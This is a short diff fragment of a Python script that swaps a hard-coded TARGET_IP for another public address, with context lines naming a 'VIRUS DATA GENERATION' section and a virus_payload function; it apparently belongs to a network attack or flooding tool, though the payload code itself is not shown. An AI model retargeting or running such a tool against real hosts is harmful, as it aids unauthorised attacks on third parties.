@@ -3,7 +3,7 @@ import threading
 import time
 import random
 
-TARGET_IP = "45.60.39.88"
+TARGET_IP = "62.109.121.42"
 
 # VIRUS DATA GENERATION
 def virus_payload(size):
